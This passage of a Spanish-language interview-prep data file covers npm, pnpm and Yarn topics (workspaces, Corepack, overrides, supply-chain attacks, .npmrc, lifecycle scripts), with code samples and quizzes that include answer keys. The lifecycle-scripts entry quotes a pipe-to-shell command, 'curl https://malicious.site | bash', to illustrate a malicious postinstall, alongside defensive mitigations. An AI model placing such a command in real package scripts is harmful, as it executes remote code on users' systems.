                "¿Qué riesgos de seguridad tiene ejecutar npx con un paquete mal escrito?",
                "¿Qué diferencia hay entre npx, pnpm dlx y npm exec?"
            ]
        },
        "quiz": {
            "question": "¿Dónde busca npx en primer lugar al intentar ejecutar un comando antes de considerar descargarlo de npm?",
            "options": [
                "En el registro público de npm",
                "En la carpeta global /usr/local/bin",
                "En el directorio local ./node_modules/.bin del proyecto",
                "En el caché temporal ~/.npm/_npx"
            ],
            "correctIndex": 2,
            "explanation": "npx siempre prioriza el directorio ./node_modules/.bin local para garantizar que se ejecute la versión exacta instalada en el proyecto antes de buscar en el sistema o descargarlo de internet."
        },
        "level": "medio"
    },
    {
        "title": "¿Cómo funcionan los Workspaces en monorepos modernos (pnpm workspaces / npm workspaces / yarn workspaces)?",
        "response": "Los **Workspaces** son una característica nativa de los gestores de paquetes modernos que permite gestionar **múltiples paquetes independientes dentro de un único repositorio de Git** (Monorepo), coordinando sus dependencias, versionado y enlaces locales de manera unificada.\n\n### Mecánica de Funcionamiento:\n1. **Linking Local mediante Symlinks**: Cuando un paquete interno `@acme/web` depende de `@acme/ui`, el gestor no descarga `@acme/ui` de npm; crea un enlace simbólico directo en `node_modules/@acme/ui` apuntando a la carpeta de código fuente `packages/ui`.\n2. **Deduplicación Global en la Raíz**: Se ejecuta un único comando de instalación (`pnpm install` o `npm install`) en la raíz del repositorio. Las dependencias externas comunes (ej. `typescript`, `react`) se resuelven y comparten, reduciendo drásticamente el espacio en disco.\n3. **Protocolo `workspace:`**:\n   - En pnpm y Yarn, se utiliza el protocolo `\"@acme/ui\": \"workspace:*\"` o `\"workspace:^1.0.0\"`.\n   - Al publicar el paquete a npm (`pnpm publish`), el gestor reemplaza automáticamente `workspace:*` por la versión numérica real (`^2.1.0`), garantizando que los consumidores externos reciban una referencia válida a npm.",
        "codeExample": {
            "language": "yaml",
            "code": "# pnpm-workspace.yaml (en la raíz del monorepo):\npackages:\n  - 'apps/*'\n  - 'packages/*'\n  - 'tooling/*'\n\n---\n# apps/web/package.json:\n{\n  \"name\": \"@acme/web\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"@acme/ui\": \"workspace:*\",\n    \"@acme/utils\": \"workspace:^\"\n  }\n}\n\n---\n# Ejecución coordinada desde la raíz:\n# pnpm --filter @acme/web run dev\n# pnpm --filter \"./packages/*\" run build"
        },
        "visualDiagram": {
            "id": "diag-pkg-10",
            "title": "Arquitectura de Workspaces en Monorepos: Linking Simbólico",
            "caption": "Los workspaces enlazan paquetes internos vía symlinks directos y consolidan dependencias externas en un único árbol coordinado.",
            "diagramType": "pkg-monorepo-workspaces-linking"
        },
        "interviewTips": {
            "whatInterviewersWant": "Explicar la diferencia entre dependencias remotas y locales enlazadas simbólicamente, y cómo el protocolo `workspace:*` es transformado a SemVer durante la publicación.",
            "commonPitfalls": [
                "Publicar un paquete a npm con la cadena literal `\"workspace:*\"` sin usar la herramienta de empaquetado del gestor que sustituye el protocolo por versiones numéricas.",
                "Instalar manualmente dependencias dentro de carpetas individuales en lugar de usar comandos raíz con filtros (`--filter` / `--workspace`)."
            ],
            "followUps": [
                "¿Cómo se referencia un paquete local del workspace (workspace:*)?",
                "¿Cómo ejecutarías un script solo en los paquetes afectados?"
            ]
        },
        "quiz": {
            "question": "¿Qué ocurre con la referencia '\"@acme/ui\": \"workspace:*\"' cuando pnpm empaqueta y publica el paquete a un registry de npm?",
            "options": [
                "Se descarta la dependencia porque los registries no admiten dependencias locales",
                "El gestor reemplaza automáticamente 'workspace:*' por la versión SemVer numérica real del paquete en ese momento",
                "El build falla porque npm rechaza el protocolo workspace",
                "Se copia el código fuente crudo dentro del bundle"
            ],
            "correctIndex": 1,
            "explanation": "Al ejecutar publish, los gestores compatibles reemplazan automáticamente el prefijo 'workspace:*' por el número de versión SemVer concreto del paquete interno para que los usuarios externos puedan consumirlo desde npm."
        },
        "level": "avanzado"
    },
    {
        "title": "¿Qué es Corepack, por qué viene integrado en Node.js y cómo garantiza la versión idéntica del gestor de paquetes en todo el equipo?",
        "response": "**Corepack** es una herramienta oficial experimental integrada en Node.js (desde Node v16.9) que actúa como un **puente intermediario de gestión de versiones de gestores de paquetes** (pnpm, Yarn y npm).\n\n### El Problema que Resuelve:\nTradicionalmente, cada desarrollador del equipo y cada runner de CI instalaban Yarn o pnpm de forma global (`npm install -g pnpm@8`). Si un desarrollador actualizaba localmente a `pnpm@9` y otro se quedaba en `pnpm@8`, el formato del archivo de lock (`pnpm-lock.yaml v6` vs `v9`) cambiaba constantemente en los Pull Requests, provocando merge conflicts catastróficos.\n\n### Cómo Funciona Corepack:\n1. En `package.json` se declara el campo oficial **`packageManager`**:\n   `\"packageManager\": \"pnpm@9.5.0+sha512.943...\"`\n2. Al activar Corepack (`corepack enable`), los binarios `yarn` y `pnpm` en el sistema apuntan a Corepack en vez de instalaciones globales fijas.\n3. Cuando cualquier desarrollador escribe `pnpm install`, Corepack lee el `package.json`, comprueba si tiene la versión `9.5.0`, la descarga en caché transparente si es necesario, y ejecuta esa versión exacta.\n4. Si el desarrollador intenta ejecutar `yarn install` en un proyecto configurado con pnpm, Corepack bloquea la ejecución para impedir la creación de lockfiles no autorizados.",
        "codeExample": {
            "language": "bash",
            "code": "# 1. Activar Corepack en el sistema operativo (solo una vez)\ncorepack enable\n\n# 2. Fijar la versión del gestor de paquetes en package.json con hash de integridad\ncorepack use pnpm@9.5.0\n\n# Resultado en package.json:\n# \"packageManager\": \"pnpm@9.5.0\"\n\n# 3. Si un compañero con Node.js clona el repo y corre 'pnpm install':\n# Corepack intercepta la llamada, descarga silenciosamente pnpm 9.5.0\n# y garantiza que todo el equipo trabaje con el mismo motor de resolución."
        },
        "visualDiagram": {
            "id": "diag-pkg-11",
            "title": "Gobernanza de Herramientas con Node.js Corepack",
            "caption": "Corepack intercepta comandos CLI y garantiza la ejecución de la versión exacta declarada en el campo packageManager de package.json.",
            "diagramType": "pkg-corepack-version-pinning"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar conocimiento sobre gobernanza de toolchains enterprise: cómo evitar diferencias de lockfiles entre colaboradores fijando `packageManager` y usando Corepack.",
            "commonPitfalls": [
                "Seguir recomendando `npm install -g yarn/pnpm` en la documentación interna del equipo en vez de estandarizar con Corepack.",
                "Ignorar que Corepack viene desactivado por defecto en algunas distribuciones de Node y requiere `corepack enable`."
            ],
            "followUps": [
                "¿Qué hace el campo packageManager en package.json?",
                "¿Cómo se activa Corepack y qué pasa si alguien usa otro gestor?"
            ]
        },
        "quiz": {
            "question": "¿Qué campo de package.json lee Corepack para determinar qué gestor y qué versión exacta debe ejecutar?",
            "options": [
                "\"engines\": { \"pnpm\": \"...\" }",
                "\"packageManager\": \"pnpm@9.5.0\"",
                "\"toolchain\": \"pnpm\"",
                "\"scripts\": { \"preinstall\": \"...\" }"
            ],
            "correctIndex": 1,
            "explanation": "El estándar formal definido por Node.js y la comunidad es el campo 'packageManager' (ej. \"pnpm@9.5.0\"), el cual es leído por Corepack para descargar y ejecutar la versión adecuada."
        },
        "level": "avanzado"
    },
    {
        "title": "¿Cómo funcionan overrides (npm) y resolutions (yarn/pnpm) para forzar versiones de dependencias transitivas?",
        "response": "En proyectos de gran envergadura, con frecuencia una dependencia secundaria o transitiva (un paquete dentro de otro paquete) tiene una vulnerabilidad crítica de seguridad o un bug que su mantenedor directo aún no ha corregido ni actualizado.\n\n### El Mecanismo de Sobrescritura de Árbol:\nPara solucionar esto sin tener que hacer forks de paquetes intermedios, los gestores proporcionan directivas de **sobrescritura forzada de versiones transitivas**:\n\n1. **`overrides` (npm v8.3+)**:\n   Permite forzar que cualquier aparición de un paquete en el árbol resuelva a una versión específica, o aplicar la regla únicamente cuando sea dependiente de un paquete padre concreto.\n2. **`resolutions` (Yarn) / `pnpm.overrides` (pnpm)**:\n   Fuerza al algoritmo de resolución a interceptar todas las solicitudes de una librería específica y redirigirlas a la versión fijada por el arquitecto.\n\n### Casos de Uso Críticos:\n- **Parchear CVEs inmediatas**: Subir `semver` o `braces` de forma global cuando una librería legacy requiere una versión vulnerable.\n- **Deduplicación forzada**: Reducir tamaño del bundle unificando versiones menores dispersas en un monorepo.",
        "codeExample": {
            "language": "json",
            "code": "// 1. Enfoque para NPM (en package.json raíz):\n{\n  \"dependencies\": {\n    \"legacy-framework\": \"^1.0.0\"\n  },\n  \"overrides\": {\n    \"semver\": \"^7.5.4\",\n    \"legacy-framework\": {\n      \"glob\": \"^10.3.10\"\n    }\n  }\n}\n\n// 2. Enfoque para PNPM (en package.json raíz):\n{\n  \"pnpm\": {\n    \"overrides\": {\n      \"axios@<1.6.0\": \">=1.6.0\",\n      \"braces\": \"^3.0.3\"\n    }\n  }\n}\n\n// 3. Enfoque para Yarn (en package.json raíz):\n{\n  \"resolutions\": {\n    \"lodash\": \"4.17.21\"\n  }\n}"
        },
        "visualDiagram": {
            "id": "diag-pkg-12",
            "title": "Sobrescritura Forzada de Dependencias Transitivas (Overrides / Resolutions)",
            "caption": "El mecanismo de overrides intercepta el árbol de resolución para parchar vulnerabilidades profundas sin necesidad de alterar librerías intermedias.",
            "diagramType": "pkg-overrides-resolutions-tree"
        },
        "interviewTips": {
            "whatInterviewersWant": "Saber cómo solucionar una vulnerabilidad de seguridad de una dependencia de 3er nivel sin esperar a que el autor de la librería padre publique una nueva versión.",
            "commonPitfalls": [
                "Forzar un cambio de versión MAJOR en una transitiva sin verificar si la API cambió, rompiendo la librería intermedia en runtime.",
                "Confundir `resolutions` (Yarn) con `overrides` (npm) en proyectos migrados."
            ],
            "followUps": [
                "¿Cuándo es legítimo forzar una dependencia transitiva?",
                "¿Qué riesgos tiene un override que rompe compatibilidad?"
            ]
        },
        "quiz": {
            "question": "¿Para qué se utiliza principalmente el campo 'overrides' en package.json en proyectos npm?",
            "options": [
                "Para sobreescribir los estilos CSS del navegador",
                "Para forzar el reemplazo de una versión de una dependencia transitiva en todo el árbol de paquetes",
                "Para cambiar los comandos de scripts en tiempo de ejecución",
                "Para sobrescribir la versión de Node.js instalada en el sistema"
            ],
            "correctIndex": 1,
            "explanation": "El campo overrides permite a los desarrolladores forzar que una dependencia transitiva (profunda) se fije en una versión específica en todo el árbol, permitiendo parchar vulnerabilidades de seguridad rápidamente."
        },
        "level": "avanzado"
    },
    {
        "title": "¿Cuáles son los principales vectores de ataque en la cadena de suministro de paquetes (typosquatting, dependency confusion, compromised maintainers)?",
        "response": "La **Cadena de Suministro de Software (Software Supply Chain)** en JavaScript es uno de los vectores de ataque más explotados debido a la inmensa cantidad de dependencias transitivas promedio en una aplicación web moderna (más de 1,000 librerías).\n\n### Vectores de Ataque Principales:\n1. **Typosquatting**:\n   - El atacante registra un paquete con un nombre casi idéntico al de una librería popular cometiendo una errata común (`cross-env` vs `crossenv`, `colors.js` vs `colour`).\n   - Si un desarrollador escribe mal el comando `npm i`, instala el paquete malicioso que roba variables de entorno (`AWS_SECRET_KEY`, tokens) durante el `postinstall`.\n2. **Dependency Confusion (Confusión de Dependencias)**:\n   - Ocurre en empresas con paquetes internos no protegidos por scopes (ej. paquete privado `auth-token`).\n   - Un atacante registra un paquete con ese mismo nombre en el registry público de `npm` con una versión altísima (`99.9.9`).\n   - Si el gestor de paquetes de la empresa está mal configurado, prioriza la versión más alta del registry público sobre el privado, inyectando malware en la infraestructura corporativa.\n3. **Compromised Maintainers / Account Takeover**:\n   - Credenciales débiles o falta de 2FA en las cuentas de npm de mantenedores de librerías populares, permitiendo que atacantes publiquen versiones maliciosas (ej. casos de `event-stream`, `ua-parser-js`).\n4. **Script Injection en Ciclo de Vida**:\n   - Scripts `preinstall` o `postinstall` que descargan y ejecutan binarios externos ofuscados.",
        "codeExample": {
            "language": "bash",
            "code": "# 1. Mitigación de Typosquatting y Scripts Maliciosos:\n# Desactivar ejecución de scripts de ciclo de vida no auditados\npnpm install --ignore-scripts\n\n# 2. Mitigación de Dependency Confusion mediante Scopes en .npmrc:\n# Obligar a que los paquetes de la organización solo se descarguen del registry interno:\n@acme:registry=https://npm.pkg.github.com\n\n# 3. Auditoría automatizada en CI/CD con Socket.dev / Snyk:\n# Detectar paquetes que intentan acceder a la red en scripts de instalación\nnpx socket info lodash"
        },
        "visualDiagram": {
            "id": "diag-pkg-13",
            "title": "Vectores de Ataque en la Cadena de Suministro de Paquetes",
            "caption": "Análisis de amenazas: Typosquatting, Confusión de Dependencias en registros mixtos y secuestro de cuentas de mantenedores.",
            "diagramType": "pkg-supply-chain-security-risks"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar visión de seguridad DevSecOps: cómo proteger la empresa mediante scopes en `.npmrc`, flags como `--ignore-scripts` y herramientas de análisis estático de dependencias.",
            "commonPitfalls": [
                "Publicar paquetes internos de la empresa sin prefijos de scope (`@empresa/`), dejándolos expuestos a Dependency Confusion.",
                "Creer que `npm audit` es suficiente: solo detecta vulnerabilidades ya catalogadas, no malware de día cero introducido en nuevas versiones."
            ],
            "followUps": [
                "¿Qué es dependency confusion y cómo se previene con scopes?",
                "¿Qué herramientas usarías para auditar la cadena de suministro (npm audit, Socket, provenance)?"
            ]
        },
        "quiz": {
            "question": "¿En qué consiste el ataque de 'Dependency Confusion' en la cadena de suministro de paquetes?",
            "options": [
                "En confundir dependencias de producción con dependencias de desarrollo",
                "En registrar un paquete en el registry público con el mismo nombre que uno privado interno pero con una versión más alta para que el gestor lo descargue",
                "En instalar un paquete compilado para Windows en un servidor Linux",
                "En utilizar Yarn y npm al mismo tiempo en el mismo repositorio"
            ],
            "correctIndex": 1,
            "explanation": "Dependency Confusion aprovecha configuraciones deficientes de búsqueda de registros: si una empresa usa un paquete privado sin scope, un atacante publica el mismo nombre en el registry público con versión 99.9.9 y el gestor descarga la versión pública infectada."
        },
        "level": "avanzado"
    },
    {
        "title": "¿Cómo se configura y autentica el acceso a registries privados mediante .npmrc con scopes (@empresa)?",
        "response": "En entornos empresariales, las organizaciones publican sus propias librerías internas (diseño, utilidades, lógica de negocio) en **registries privados** (GitHub Packages, GitLab, AWS CodeArtifact, Verdaccio o Nexus) manteniendo el consumo del registry público de npm para librerías abiertas.\n\n### Enrutamiento por Scopes con `.npmrc`:\nEl archivo `.npmrc` en la raíz del repositorio permite enrutar paquetes según su **scope** (`@organizacion`):\n1. **Enrutamiento selectivo**: Todo paquete cuyo nombre empiece con `@acme/` se solicita al registry privado corporativo.\n2. **Registry por defecto**: El resto de paquetes sin scope (ej. `react`, `lodash`) continúan descargándose desde `registry.npmjs.org`.\n3. **Autenticación sin credenciales fijas**: Los tokens de autenticación NUNCA se guardan en texto plano en el archivo `.npmrc` commiteado a Git; se inyectan dinámicamente mediante variables de entorno del sistema (`${NPM_TOKEN}`).",
        "codeExample": {
            "language": "ini",
            "code": "# Archivo: .npmrc (commiteado en el repositorio)\n\n# 1. Enrutar el scope @acme al registry privado de GitHub Packages\n@acme:registry=https://npm.pkg.github.com\n\n# 2. Configurar autenticación usando variable de entorno segura\n//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}\n\n# 3. El registry general sigue apuntando al oficial público de npm\nregistry=https://registry.npmjs.org/\n\n# 4. Forzar lockfile estricto y prevenir dependencias fantasma\nengine-strict=true\nauto-install-peers=true"
        },
        "visualDiagram": {
            "id": "diag-pkg-14",
            "title": "Enrutamiento Dual de Registries Privados vía .npmrc",
            "caption": "Mapeo de scopes: paquetes @acme/* se enrutan al registro privado autenticado, mientras paquetes estándar se descargan del registro público.",
            "diagramType": "pkg-private-registry-npmrc"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar buenas prácticas de seguridad: saber cómo se estructura un `.npmrc` enterprise sin exponer tokens en Git y cómo funciona el enrutamiento selectivo por scopes.",
            "commonPitfalls": [
                "Commitear un token personal de GitHub o npm en el archivo `.npmrc` en texto plano.",
                "Redirigir todo el registry global al servidor privado sin configurar proxy inverso hacia npmjs.org, cortando la descarga de librerías abiertas."
            ],
            "followUps": [
                "¿Cómo evitarías commitear tokens en .npmrc?",
                "¿Cómo autenticarías un registry privado en CI?"
            ]
        },
        "quiz": {
            "question": "¿Cuál es la forma segura y estándar de proporcionar el token de autenticación en un archivo .npmrc dentro de un repositorio Git?",
            "options": [
                "Escribir el token directamente en la línea: _authToken=ghp_secret12345",
                "Referenciar una variable de entorno del sistema como //registry.domain/:_authToken=${NPM_TOKEN}",
                "Guardar la contraseña del usuario en base64",
                "Subir un archivo id_rsa en la carpeta .npm"
            ],
            "correctIndex": 1,
            "explanation": "El archivo .npmrc admite interpolación de variables de entorno con la sintaxis ${NPM_TOKEN}, permitiendo commitear el archivo al repositorio mientras los secretos se inyectan en CI/CD o perfiles de terminal locales."
        },
        "level": "experto"
    },
    {
        "title": "¿Qué es el campo exports en package.json y cómo resuelve la dualidad ESM vs CommonJS y encapsulación de módulos?",
        "response": "Históricamente, los paquetes Node.js utilizaban el campo `\"main\"` para definir un único punto de entrada en CommonJS. Con la llegada de los **ECMAScript Modules (ESM)** y TypeScript moderno, el campo **`\"exports\"`** se convirtió en el estándar oficial (Node.js v12.7+) para reemplazarlos, ofreciendo dos capacidades revolucionarias:\n\n### 1. Dual Package Hazard Solved (Resolución Condicional):\nPermite proveer de forma nativa variantes ESM (`import`) y CommonJS (`require`) con sus tipos correspondientes (`types`) sin colisiones:\n- Si el consumidor usa `import { Button } from '@acme/ui'`, el runtime carga la versión ESM compilada con `import` nativo.\n- Si usa `const { Button } = require('@acme/ui')`, carga la variante CommonJS compilada.\n\n### 2. Encapsulación Estricta de Módulos (Subpath Exports):\nCualquier sub-archivo que NO esté explícitamente listado en el mapa de `exports` queda **completamente bloqueado e inaccesible** para el consumidor.\n- Antiguamente, los usuarios podían hacer `import x from 'mi-lib/dist/internal/private-helper.js'`.\n- Con `exports`, intentar importar un path no declarado arroja `ERR_PACKAGE_PATH_NOT_EXPORTED`, protegiendo la arquitectura interna de la librería contra dependencias privadas no soportadas.",
        "codeExample": {
            "language": "json",
            "code": "{\n  \"name\": \"@acme/core\",\n  \"version\": \"3.0.0\",\n  \"type\": \"module\",\n  \"exports\": {\n    \".\": {\n      \"types\": \"./dist/index.d.ts\",\n      \"import\": \"./dist/index.js\",\n      \"require\": \"./dist/index.cjs\"\n    },\n    \"./button\": {\n      \"types\": \"./dist/button.d.ts\",\n      \"import\": \"./dist/button.js\",\n      \"require\": \"./dist/button.cjs\"\n    },\n    \"./styles.css\": \"./dist/styles.css\"\n  }\n}"
        },
        "visualDiagram": {
            "id": "diag-pkg-15",
            "title": "Encapsulación y Dual Package Resolution con el Campo 'exports'",
            "caption": "Mapeo condicional para ESM y CommonJS, permitiendo puntos de entrada tipados y bloqueando rutas internas privadas.",
            "diagramType": "pkg-modern-exports-map-dual"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar que entiendes cómo construir librerías modernas duales (ESM + CJS) y por qué `exports` es crucial para evitar que los usuarios rompan su código importando archivos internos no oficiales.",
            "commonPitfalls": [
                "Colocar la condición `\"types\"` al final de la definición de exports (TypeScript requiere que `types` sea siempre la primera clave del objeto condicional).",
                "Olvidar agregar extensiones completas (`.js`, `.cjs`) en las rutas de exports."
            ],
            "followUps": [
                "¿Qué es el dual package hazard?",
                "¿Cómo impide exports importar rutas internas de un paquete?"
            ]
        },
        "quiz": {
            "question": "¿Qué error arroja Node.js si un desarrollador intenta importar un archivo interno de un paquete que no está definido en el mapa 'exports' de su package.json?",
            "options": [
                "ERR_MODULE_NOT_FOUND",
                "ERR_PACKAGE_PATH_NOT_EXPORTED",
                "EACCES: permission denied",
                "SYNTAX_ERROR_PRIVATE_FIELD"
            ],
            "correctIndex": 1,
            "explanation": "El campo exports proporciona encapsulación estricta: cualquier ruta no declarada en el mapa expone el error nativo ERR_PACKAGE_PATH_NOT_EXPORTED, impidiendo el acoplamiento a módulos internos."
        },
        "level": "experto"
    },
    {
        "title": "¿Cómo automatiza Changesets el versionado SemVer y changelogs coordinados en monorepos complejos?",
        "response": "En monorepos que albergan decenas de paquetes interconectados, coordinar qué paquete debe subir de versión (`patch`, `minor` o `major`) y actualizar sus `CHANGELOG.md` correspondientes cuando se fusiona un Pull Request es un proceso propenso a errores humanos.\n\n### La Metodología de Changesets:\n**Changesets** sustituye el análisis frágil de commits convencionales por un flujo explícito y colaborativo:\n1. **Creación del Changeset (`pnpm changeset`)**:\n   - Al crear una feature o fix en una rama, el desarrollador corre el comando interactivo.\n   - Selecciona qué paquetes del monorepo se vieron modificados y qué tipo de bump SemVer requieren (`major`, `minor`, `patch`).\n   - Escribe un resumen en markdown con el impacto de los cambios.\n2. **Almacenamiento en Git**:\n   - Se genera un pequeño archivo markdown temporal bajo la carpeta `.changeset/` (ej. `.changeset/cyan-lions-dance.md`). Este archivo se commitea junto con el código del PR.\n3. **Automatización en CI (GitHub Action)**:\n   - En la rama `main`, Changesets analiza todos los archivos acumulados en `.changeset/`.\n   - Abre automáticamente un Pull Request titulado `\"Version Packages\"` donde calcula los bumps SemVer (incluyendo paquetes dependientes), genera los `CHANGELOG.md` y borra los archivos temporales.\n   - Al mergear ese PR, se ejecuta `changeset publish` y los paquetes se publican en npm.",
        "codeExample": {
            "language": "markdown",
            "code": "--- # Archivo: .changeset/cool-dragons-leap.md\n\"@acme/ui\": minor\n\"@acme/web\": patch\n---\n\nSe agrega soporte para tema oscuro (`dark mode`) en el componente `Button`\ny se actualiza la configuración de colores en la aplicación web consumidora.\n\n### Breaking Changes\nNinguno. Totalmente retrocompatible con versiones 2.x."
        },
        "visualDiagram": {
            "id": "diag-pkg-16",
            "title": "Flujo de Versionado y Release Automatizado con Changesets",
            "caption": "Ciclo desde el registro local de intenciones (.changeset/), generación de PR de release en CI, hasta la publicación SemVer en npm.",
            "diagramType": "pkg-changesets-monorepo-release"
        },
        "interviewTips": {
            "whatInterviewersWant": "Explicar cómo gestionar lanzamientos en monorepos sin fricción humana ni dependencias circulares, comparando Changesets con Semantic Release tradicional.",
            "commonPitfalls": [
                "Intentar usar Semantic Release clásico en monorepos grandes donde múltiples paquetes requieren versiones independientes desacopladas.",
                "Olvidar commitear el archivo generado en `.changeset/` dentro del PR de la feature."
            ],
            "followUps": [
                "¿Cómo se gestionan las dependencias internas al publicar con Changesets?",
                "¿Qué diferencia hay entre Changesets y Semantic Release?"
            ]
        },
        "quiz": {
            "question": "¿Dónde y cómo guarda Changesets la información de los cambios realizados antes de generar el release oficial?",
            "options": [
                "En una base de datos externa de Cloudflare KV",
                "En archivos markdown temporales dentro de la carpeta .changeset/ commiteados en el repositorio",
                "En los tags de Git de la rama principal",
                "En un branch huérfano llamado 'changesets-state'"
            ],
            "correctIndex": 1,
            "explanation": "Changesets almacena cada intención de cambio en archivos markdown individuales dentro de la carpeta .changeset/. Esto permite que coexistan múltiples features en desarrollo y se consoliden de forma atómica en el PR de release."
        },
        "level": "experto"
    },
    {
        "title": "¿Cómo se optimiza el tiempo de instalación y caché en CI/CD con pnpm content-addressable store y GitHub Actions?",
        "response": "En arquitecturas frontend enterprise, las instalaciones de dependencias sin optimizar consumen del 40% al 70% del tiempo total de los jobs de CI/CD. Optimizar este cuello de botella requiere comprender la capa de almacenamiento físico del gestor de paquetes.\n\n### Estrategia de Alto Rendimiento con pnpm:\n1. **Content-Addressable Store Global**: En lugar de cachear el directorio pesado y mutable `node_modules` (que contiene millones de archivos pequeños y symlinks rotos al restaurar), se cachea exclusivamente la carpeta del **pnpm virtual store** (`pnpm store path`).\n2. **Clave de Caché Criptográfica**: La clave de caché en GitHub Actions se vincula al hash exacto del lockfile (`hashFiles('**/pnpm-lock.yaml')`).\n3. **Instalación sin red**: Cuando el store ya está en la caché del runner de CI, `pnpm install --frozen-lockfile` no realiza peticiones HTTP; simplemente reconstruye los hard links locales en menos de 5 segundos.",
        "codeExample": {
            "language": "yaml",
            "code": "# Pipeline optimizado de GitHub Actions (.github/workflows/ci.yml)\nname: CI Pipeline\non: [push, pull_request]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install pnpm\n        uses: pnpm/action-setup@v3\n        with:\n          version: 9\n          run_install: false\n\n      - name: Setup Node.js con caché integrada de pnpm\n        uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: 'pnpm'\n\n      - name: Install dependencies (Ultra rápido desde store cacheado)\n        run: pnpm install --frozen-lockfile\n\n      - name: Build & Test\n        run: pnpm run test"
        },
        "visualDiagram": {
            "id": "diag-pkg-17",
            "title": "Optimización de Pipelines de CI/CD: Caché del Content-Addressable Store",
            "caption": "Cachear el almacén global de pnpm en CI/CD reduce las descargas remotas a cero, reconstruyendo node_modules mediante enlaces duros instantáneos.",
            "diagramType": "pkg-ci-caching-pnpm-store"
        },
        "interviewTips": {
            "whatInterviewersWant": "Demostrar conocimiento sobre optimización de CI/CD: por qué cachear el store de pnpm es más eficiente y estable que cachear la carpeta `node_modules` directamente.",
            "commonPitfalls": [
                "Cachear la carpeta `node_modules` directamente en CI con pnpm (los symlinks se corrompen o pierden referencias al transferirse entre runners).",
                "Omitir el flag `--frozen-lockfile` en el comando de instalación de CI."
            ],
            "followUps": [
                "¿Qué clave de caché usarías en GitHub Actions para el store de pnpm?",
                "¿Qué diferencia hay entre cachear node_modules y cachear el store?"
            ]
        },
        "quiz": {
            "question": "¿Por qué en CI/CD es una mala práctica cachear directamente la carpeta 'node_modules' generada por pnpm?",
            "options": [
                "Porque pnpm borra automáticamente los archivos de más de 100 MB",
                "Porque node_modules en pnpm depende de symlinks hacia el global store; si el store no está presente, los enlaces simbólicos quedan rotos",
                "Porque GitHub Actions bloquea archivos con extensión .js",
                "Porque node_modules se descarga obligatoriamente de internet siempre"
            ],
            "correctIndex": 1,
            "explanation": "En pnpm, node_modules está compuesto casi exclusivamente por symlinks que apuntan al Content-Addressable Store. Si restauras node_modules sin el store correspondiente, todos los enlaces simbólicos quedan huérfanos y rotos."
        },
        "level": "experto"
    },
    {
        "title": "¿Cuál es el orden de ejecución y riesgos de seguridad de los lifecycle scripts (preinstall, postinstall, prepare)?",
        "response": "Los **Lifecycle Scripts** son ganchos automáticos provistos por npm y gestores afines que ejecutan comandos arbitrarios en el sistema operativo en etapas específicas de la instalación o empaquetado.\n\n### Orden de Ejecución Clave:\n1. **`preinstall`**: Se ejecuta antes de que los paquetes comiencen a descargarse o desempaquetarse.\n2. **`install` / `postinstall`**:\n   - Se ejecuta inmediatamente después de que un paquete y sus dependencias han sido colocados en el disco.\n   - **Uso legítimo**: Compilar extensiones nativas en C++ (`node-gyp`), descargar binarios específicos de arquitectura (ej. binarios de `esbuild` o `swc`) o generar clientes tipados (ej. `prisma generate`).\n3. **`prepare`**:\n   - Se ejecuta en instalaciones locales (`npm install`) y antes de publicar (`npm publish`). Es el lugar estándar para configurar herramientas de Git hooks como **Husky** (`husky install`).\n\n### Riesgo de Seguridad y Mitigación:\nEl script `postinstall` es el vector de ataque más peligroso en npm: un paquete malicioso puede ejecutar `curl https://malicious.site | bash` o leer variables de entorno y enviarlas a un servidor remoto.\n- **Mitigación**: Usar el flag `--ignore-scripts` en entornos no confiables, o herramientas como `@lavamoat/allow-scripts` que exigen autorizar explícitamente qué librerías tienen permiso de ejecutar código de ciclo de vida.",
        "codeExample": {
            "language": "bash",
            "code": "# 1. Uso legítimo en package.json (Prisma y Husky):\n{\n  \"scripts\": {\n    \"prepare\": \"husky\",\n    \"postinstall\": \"prisma generate\"\n  }\n}\n\n# 2. Blindar la instalación contra scripts maliciosos en desarrollo o CI:\npnpm install --ignore-scripts\n\n# 3. Re-ejecutar manualmente solo los scripts de paquetes confiables:\npnpm rebuild esbuild prisma"
        },
        "visualDiagram": {
            "id": "diag-pkg-18",
            "title": "Ciclo de Vida y Flujo de Ejecución de Lifecycle Scripts",
            "caption": "Secuencia cronológica desde preinstall hasta prepare y postinstall, identificando riesgos de inyección de código arbitrario.",
            "diagramType": "pkg-lifecycle-scripts-execution"
        },
        "interviewTips": {
            "whatInterviewersWant": "Conocer para qué se usa `prepare` (Husky/Git hooks), por qué `postinstall` es crítico para binarios nativos, y cómo mitigar ataques de inyección mediante `--ignore-scripts`.",
            "commonPitfalls": [
                "Colocar compilaciones pesadas de TypeScript en `postinstall` en vez de `prepare` o `prepack`.",
                "Descargar paquetes de orígenes desconocidos sin revisar si contienen scripts de `postinstall` maliciosos."
            ],
            "followUps": [
                "¿Por qué los scripts postinstall son un vector de ataque?",
                "¿Cómo deshabilitarías los lifecycle scripts (--ignore-scripts)?"
            ]
        },
        "quiz": {
            "question": "¿Qué flag de instalación de npm/pnpm impide la ejecución automática de scripts de ciclo de vida (como postinstall) protegiendo el sistema contra código malicioso?",
            "options": [
                "--safe-mode",
                "--ignore-scripts",
                "--no-lifecycle",
                "--sandbox-install"
            ],
            "correctIndex": 1,
            "explanation": "El flag '--ignore-scripts' desactiva la ejecución de cualquier hook de ciclo de vida (preinstall, postinstall, prepare), impidiendo que dependencias maliciosas ejecuten código arbitrario en tu máquina."
        },
        "level": "avanzado"
    },
    {
        "title": "¿Cómo se auditan y eliminan dependencias no utilizadas (dead dependencies) con herramientas como Knip o Depcheck?",
